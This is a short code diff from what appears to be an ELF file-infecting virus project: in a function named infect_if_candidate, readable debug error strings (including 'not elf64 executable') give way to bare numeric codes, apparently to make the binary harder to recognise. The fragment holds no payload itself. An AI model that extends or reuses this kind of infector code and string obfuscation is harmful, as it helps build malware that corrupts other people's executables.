@@ -42,10 +42,10 @@ inline bool	infect_if_candidate(const char *file)
 	int		fd = famine_open(file, O_RDONLY);
 
 #ifdef DEBUG
-	char e0[] = {'c','a','n','n','o','t',' ','o','p','e','n','\0'};
-	char e1[] = {'r','e','a','d',' ','e','l','f','6','4',' ','h','e','a','d','e','r',' ','f','a','i','l','e','d','\0'};
-	char e2[] = {'n','o','t',' ','e','l','f','6','4',' ','e','x','e','c','u','t','a','b','l','e','\0'};
-	char e3[] = {'i','n','f','e','c','t','_','i','f','_','c','a','n','d','i','d','a','t','e','\0'};
+	char e0[] = {'4','1','\0'};
+	char e1[] = {'4','2','\0'};
+	char e2[] = {'4','3','\0'};
+	char e3[] = {'4','4','\0'};
 #endif
 	if (fd < 0)
 	{
